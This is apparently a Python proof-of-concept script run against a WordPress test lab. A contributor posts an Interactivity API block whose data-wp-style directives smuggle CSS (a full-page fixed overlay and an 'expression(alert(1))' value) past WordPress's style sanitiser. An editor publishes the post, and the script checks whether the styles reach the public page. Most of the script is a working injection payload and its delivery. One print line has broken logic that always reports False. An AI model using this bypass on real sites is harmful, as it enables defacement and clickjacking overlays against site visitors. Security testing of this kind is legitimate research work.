import re, requests
from wplab import sess, BASE
contrib = sess("contributor"); editor = sess("editor"); anon = requests.Session()

# Contributor plants data-wp-style with CSS that safecss_filter_attr would strip.
PAYLOAD = ("<!-- wp:html -->\n"
  "<div data-wp-interactive='{\"namespace\":\"pwn\"}' "
  "data-wp-context='{\"p\":\"fixed\",\"z\":\"2147483647\",\"e\":\"expression(alert(1))\"}' "
  "data-wp-style--position=\"context.p\" data-wp-style--z-index=\"context.z\" "
  "data-wp-style--width=\"context.e\" id=\"csstest\">overlay</div>\n<!-- /wp:html -->")

j = contrib.rest("POST","/wp/v2/posts",json={"title":"css inj","content":PAYLOAD,"status":"pending"}).json()
pid=j["id"]
print("contributor unfiltered_html:", "unfiltered_html" in (j.get("content",{}).get("raw","") and "" or ""))
editor.rest("POST",f"/wp/v2/posts/{pid}",json={"status":"publish"})
html = anon.get(BASE+f"/?p={pid}").text
m = re.search(r'<div[^>]*id="csstest"[^>]*>', html)
anchor = m.group(0) if m else "NOT FOUND"
print("front-end element:", anchor)
sm = re.search(r'style="([^"]*)"', anchor)
print("applied style     :", sm.group(1) if sm else "(none)")
print("expression() present (safecss would strip):", "expression(" in anchor)
